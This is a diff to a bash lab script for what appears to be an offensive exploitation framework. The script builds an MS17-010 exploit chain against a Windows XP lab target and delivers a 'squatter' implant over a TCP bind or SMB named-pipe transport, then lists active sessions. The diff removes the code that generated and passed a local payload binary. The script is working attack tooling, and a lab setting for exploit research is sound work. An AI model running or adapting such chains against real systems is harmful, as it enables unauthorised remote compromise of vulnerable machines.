@@ -4,7 +4,6 @@ set -euo pipefail
 root="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
 workspace="${HOVEL_WORKSPACE:-"$root/.hovel"}"
 module_config="${HOVEL_MODULE_CONFIG:-"$root/examples/hovel-modules.json"}"
-squatter_payload="${SQUATTER_PAYLOAD_PATH:-"$root/examples/bin/squatter.exe"}"
 target_host="${HOVEL_LAB_TARGET_HOST:-192.168.122.142}"
 target_id="${HOVEL_LAB_TARGET_ID:-xp-lab}"
 transport="${HOVEL_SQUATTER_TYPE:-tcp-bind}"
@@ -27,13 +26,6 @@ if [[ -n "$remote_path" ]]; then
   remote_chain_config="    squatter.remote_path: '$remote_path'"
   remote_target_config="        payload.remote_path: '$remote_path'"
 fi
-
-generate_named_pipe_payload() {
-  local out="$workspace/lab/squatter-${pipe_name}.exe"
-  HOVEL_MODULE_CONFIG="$module_config" task run -- //payloads/squatter/provider:squatter-generate -- \
-    --transport smb-named-pipe --pipe "\\\\.\\pipe\\${pipe_name}" --out "$out" >/dev/null
-  squatter_payload="$out"
-}
 
 admin_probe_ok() {
   HOVEL_MODULE_CONFIG="$module_config" task run -- //payloads/squatter/client/cmd/smbadminctl -- \
@@ -81,7 +73,6 @@ maybe_disable_forceguest() {
 }
 
 if [[ "$transport" == "smb-named-pipe" ]]; then
-  generate_named_pipe_payload
   maybe_disable_forceguest
 fi
 
@@ -109,7 +100,6 @@ $remote_chain_config
         target.port: "445"
         pipe: "spoolss"
         payload.transport: "$transport"
-        payload.local_path: "$squatter_payload"
 $remote_target_config
         payload.bind_port: "$bind_port"
         payload.pipe: '$pipe_path'
@@ -129,7 +119,7 @@ if [[ "$transport" == "smb-named-pipe" ]]; then
 else
   echo "Throwing MS17-010 -> Squatter TCP bind at $target_host:$bind_port"
 fi
-SQUATTER_PAYLOAD_PATH="$squatter_payload" HOVEL_MODULE_CONFIG="$module_config" HOVEL_WORKSPACE="$workspace" task throw -- "$chain_file" --allow-dangerous --now
+HOVEL_MODULE_CONFIG="$module_config" HOVEL_WORKSPACE="$workspace" task throw -- "$chain_file" --allow-dangerous --now
 echo
 echo "Active sessions:"
 HOVEL_MODULE_CONFIG="$module_config" task run -- //cmd/hovel -- session list --workspace "$workspace"
